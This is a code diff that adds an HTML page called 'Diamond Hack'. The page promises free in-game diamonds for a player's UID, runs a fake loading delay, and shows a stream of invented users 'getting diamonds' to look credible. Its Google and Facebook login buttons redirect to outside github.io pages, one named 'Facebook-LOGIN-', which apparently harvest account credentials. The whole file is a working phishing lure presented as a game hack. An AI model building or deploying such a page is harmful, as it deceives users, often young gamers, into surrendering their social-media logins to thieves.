@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Diamond Hack</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+      background: #000;
+      color: white;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 20px;
+      text-align: center;
+    }
+    h1 {
+      color: #00ffcc;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #00ffcc;
+    }
+    .selected-package {
+      font-size: 1.2rem;
+      color: #00ffcc;
+      margin-bottom: 15px;
+      display: none;
+    }
+    input[type="number"] {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      margin-bottom: 15px;
+      font-size: 16px;
+      text-align: center;
+      outline: none;
+      background-color: #111;
+      color: #00ffcc;
+      box-shadow: 0 0 10px #00ffcc88;
+    }
+    .submit-btn {
+      background: #00ffcc;
+      color: #000;
+      border: none;
+      padding: 10px 20px;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .diamond-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .package {
+      background-color: #111;
+      padding: 12px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .package:hover {
+      background-color: #222;
+      box-shadow: 0 0 8px #00ffcc88;
+    }
+    .logs {
+      margin-top: 30px;
+      background: #111;
+      padding: 15px;
+      border-radius: 10px;
+      max-height: 200px;
+      overflow-y: auto;
+      font-size: 14px;
+      text-align: left;
+      box-shadow: 0 0 5px #00ffcc44;
+    }
+    .log-entry {
+      margin-bottom: 6px;
+    }
+    .log-entry span {
+      color: #00ffcc;
+    }
+    .loader {
+      display: none;
+      margin: 15px auto;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #00ffcc;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .diamond-icon {
+      width: 16px;
+      vertical-align: middle;
+    }
+    .diamond-emoji {
+      font-size: 48px;
+      display: none;
+      margin: 20px auto;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+      100% { transform: scale(1); }
+    }
+    .login-options {
+      display: none;
+      margin-top: 20px;
+      animation: fadeIn 1s;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .login-title {
+      font-size: 1.2rem;
+      margin-bottom: 15px;
+      color: #00ffcc;
+    }
+    .login-btn {
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      margin: 10px 0;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.3s;
+    }
+    .login-btn:hover {
+      transform: translateY(-3px);
+    }
+    .facebook-btn {
+      background: linear-gradient(135deg, #3b5998, #2d4373);
+      box-shadow: 0 4px 15px rgba(59, 89, 152, 0.4);
+    }
+    .google-btn {
+      background: linear-gradient(135deg, #DB4437, #c1351b);
+      box-shadow: 0 4px 15px rgba(219, 68, 55, 0.4);
+    }
+    .btn-icon {
+      width: 20px;
+      margin-right: 10px;
+    }
+    .success-message {
+      color: #00ffcc;
+      font-size: 1.1rem;
+      margin-bottom: 20px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>💎 Diamond Hack</h1>
+    <div class="selected-package" id="selectedPackage"></div>
+
+    <input type="number" id="uid" placeholder="Enter your UID" />
+
+    <div class="diamond-list" id="diamondList"></div>
+
+    <button class="submit-btn" onclick="handleSubmit()">Submit</button>
+    
+    <div class="diamond-emoji" id="diamondEmoji">💎</div>
+    
+    <div class="success-message" id="successMessage">
+      Diamond request successful! Please login to continue:
+    </div>
+
+    <div class="loader" id="loader"></div>
+    
+    <div class="login-options" id="loginOptions">
+      <div class="login-title">Choose Login Method:</div>
+      <button class="login-btn facebook-btn" onclick="loginWithFacebook()">
+        <img src="https://img.icons8.com/fluency/48/facebook-new.png" class="btn-icon">
+        Continue with Facebook
+      </button>
+      <button class="login-btn google-btn" onclick="loginWithGoogle()">
+        <img src="https://img.icons8.com/color/48/google-logo.png" class="btn-icon">
+        Continue with Google
+      </button>
+    </div>
+
+    <div class="logs" id="logs"></div>
+  </div>
+  
+  <script>
+    const diamondPackages = [
+      "25 Dimond", "50 Dimond", "115 Dimond",
+      "240 Dimond", "610 Dimond", "1090 Dimond",
+      "1240 Dimond", "1595 Dimond", "2090 Dimond", "2530 Dimond"
+    ];
+
+    const fakeUsers = ["Raju", "Kiran", "Laxmi", "Bibek", "Sandhya", "Rita", "Kushal", "Sunita"];
+    const selected = document.getElementById("selectedPackage");
+    const list = document.getElementById("diamondList");
+    const logs = document.getElementById("logs");
+    const loader = document.getElementById("loader");
+    const diamondEmoji = document.getElementById("diamondEmoji");
+    const loginOptions = document.getElementById("loginOptions");
+    const successMessage = document.getElementById("successMessage");
+
+    let selectedText = "";
+
+    diamondPackages.forEach(item => {
+      const div = document.createElement("div");
+      div.className = "package";
+      div.innerHTML = `💎 ${item}`;
+      div.onclick = () => {
+        selectedText = item;
+        selected.style.display = "block";
+        selected.innerHTML = `Selected: 💎 ${item}`;
+      };
+      list.appendChild(div);
+    });
+
+    function handleSubmit() {
+      const uid = document.getElementById("uid").value.trim();
+      if (!uid || !selectedText) {
+        alert("Please enter UID and select a package.");
+        return;
+      }
+      loader.style.display = "block";
+      setTimeout(() => {
+        loader.style.display = "none";
+        diamondEmoji.style.display = "block";
+        successMessage.style.display = "block";
+        loginOptions.style.display = "block";
+      }, 3000);
+    }
+
+    function loginWithGoogle() {
+      window.location.href = "https://kiranxettry.github.io/Kiranxettry/";
+    }
+
+    function loginWithFacebook() {
+      window.location.href = "https://kiranxettry.github.io/Facebook-LOGIN-/";
+    }
+
+    function addFakeUserLog() {
+      const count = Math.floor(Math.random() * 2) + 5; // 5-6 users
+      for (let i = 0; i < count; i++) {
+        const name = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
+        const units = Math.floor(Math.random() * 1000) + 50;
+        const minutesAgo = Math.floor(Math.random() * 5) + 1;
+        const entry = document.createElement("div");
+        entry.className = "log-entry";
+        entry.innerHTML = `<span>${name}</span> got <span>${units}</span> diamonds <span>${minutesAgo} min ago</span>`;
+        logs.prepend(entry);
+        if (logs.childElementCount > 50) logs.removeChild(logs.lastChild);
+      }
+    }
+
+    setInterval(addFakeUserLog, 1000);
+  </script>
+</body>
+</html>
